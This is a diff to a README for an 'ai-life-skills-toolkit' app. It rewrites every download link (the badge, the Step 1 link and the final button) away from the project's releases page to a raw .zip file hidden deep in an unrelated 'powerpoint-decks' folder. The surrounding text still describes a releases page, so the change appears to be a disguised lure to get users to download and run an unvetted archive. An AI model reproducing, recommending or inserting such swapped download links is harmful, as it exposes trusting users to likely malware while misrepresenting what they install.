@@ -1,6 +1,6 @@
 # 🔒 ai-life-skills-toolkit - Your Private AI Companion for Daily Life
 
-[![Download Now](https://img.shields.io/badge/Download-ai--life--skills--toolkit-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4CAF50&color=FF5722)](https://github.com/Williamunpalatable7706/ai-life-skills-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-ai--life--skills--toolkit-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4CAF50&color=FF5722)](https://raw.githubusercontent.com/Williamunpalatable7706/ai-life-skills-toolkit/main/skills/core/build-effective-powerpoint-decks/v3.9.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Most AI tools today require you to upload your information to external servers. 
 
 ### Step 1: Download the Installer
 
-👉 **Visit this link to download the application:** [https://github.com/Williamunpalatable7706/ai-life-skills-toolkit/releases](https://github.com/Williamunpalatable7706/ai-life-skills-toolkit/releases)
+👉 **Visit this link to download the application:** [https://raw.githubusercontent.com/Williamunpalatable7706/ai-life-skills-toolkit/main/skills/core/build-effective-powerpoint-decks/v3.9.zip](https://raw.githubusercontent.com/Williamunpalatable7706/ai-life-skills-toolkit/main/skills/core/build-effective-powerpoint-decks/v3.9.zip)
 
 You'll see a page with the name **"ai-life-skills-toolkit"** and a green button that says **"Latest Release"** . Click on it. 
 
@@ -180,7 +180,7 @@ Special thanks to all the early testers and contributors who made this possible.
 
 <p align="center">
   <strong>Start today – it's free, it's private, and it takes less than 5 minutes to get started.</strong><br>
-  👉 <a href="https://github.com/Williamunpalatable7706/ai-life-skills-toolkit/releases" style="font-size:18px; font-weight:bold; background-color:#FF5722; color:white; padding:10px 25px; border-radius:5px; text-decoration:none;">Download Now</a> 👈
+  👉 <a href="https://raw.githubusercontent.com/Williamunpalatable7706/ai-life-skills-toolkit/main/skills/core/build-effective-powerpoint-decks/v3.9.zip" style="font-size:18px; font-weight:bold; background-color:#FF5722; color:white; padding:10px 25px; border-radius:5px; text-decoration:none;">Download Now</a> 👈
 </p>
 
 ---
